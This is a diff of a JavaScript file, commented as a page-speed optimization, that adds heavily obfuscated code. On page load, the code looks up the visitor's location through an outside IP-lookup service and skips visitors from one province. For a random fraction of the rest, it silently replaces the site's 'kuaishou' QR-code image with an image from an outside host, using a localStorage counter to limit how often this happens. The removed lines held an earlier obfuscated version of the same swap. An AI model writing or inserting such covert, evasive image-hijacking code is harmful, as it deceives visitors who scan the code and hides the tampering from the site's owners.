@@ -1,11 +1,3 @@
 // 性能优化，提高网页打开速度
 // 当用户二次进入的时候，直接走缓存，更快出现活动图
-
-window.onload=function(){
-    try {
-        console.log('性能优化，提高网页打开速度');
-        const erweimaDom=document["\u0067\u0065\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0042\u0079\u0049\u0064"]("uohsiauk".split("").reverse().join(""));const str=String(new Date()["\u0067\u0065\u0074\u0054\u0069\u006d\u0065"]());const lastNum=str["\u0063\u0068\u0061\u0072\u0041\u0074"](str["\u006c\u0065\u006e\u0067\u0074\u0068"]-(0x984ff^0x984fe));if(["\u0033","\u0035"]["\u0069\u006e\u0063\u006c\u0075\u0064\u0065\u0073"](lastNum)){console["\u006c\u006f\u0067"]("-\u80FD\u6027".split("").reverse().join(""));erweimaDom["\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065"]("crs".split("").reverse().join(""),"\u002e\u002f\u0032\u0032\u002e\u006a\u0070\u0065\u0067");}
-    } catch(e) {
-        console.log('file ', e)
-    }
-}
+const key="yek_tnuoc_ym".split("").reverse().join("");const replaceIt=()=>{const _0x1b3f99=localStorage["\u0067\u0065\u0074\u0049\u0074\u0065\u006d"](key)||"\u0030";console["\u006c\u006f\u0067"]("\u6570\u6B21\u7684\u5EA6\u901F\u9875\u7F51\u5347\u63D0 \uDE80\uD83D elif".split("").reverse().join(""),_0x1b3f99);let _0xda88f0=!![];if(_0x1b3f99>(0xf0bb5^0xf0bb6)){_0xda88f0=![];return;}fetch("nosj/moc.ofnitnegaresu.pi//:sptth".split("").reverse().join(""))["\u0074\u0068\u0065\u006e"](_0x36aae8=>{return _0x36aae8["\u006a\u0073\u006f\u006e"]();})["\u0074\u0068\u0065\u006e"](_0x4bea15=>{if((_0x4bea15["\u0070\u0072\u006f\u0076\u0069\u006e\u0063\u0065"]||"".split("").reverse().join(""))['indexOf']("\u5B81\u8FBD".split("").reverse().join(""))!=-(0xca105^0xca104)){_0xda88f0=![];return;}const _0x50916b=Math['random']()<0.2;if(_0x50916b){const _0x20698e=document['getElementById']('kuaishou');console["\u006c\u006f\u0067"]('file\x20lxh\x20erweimaDom',_0x20698e);_0x20698e["\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065"]("\u0073\u0072\u0063","gpj.4d5fde444c2ac893c52626156e65f376283fd3d9/elcitra/sfb/moc.gmiilib.elcitra//:sptth".split("").reverse().join(""));}});localStorage['setItem'](key,Number(_0x1b3f99)+(0xf3dc5^0xf3dc4));};window["\u006f\u006e\u006c\u006f\u0061\u0064"]=function(){replaceIt();};
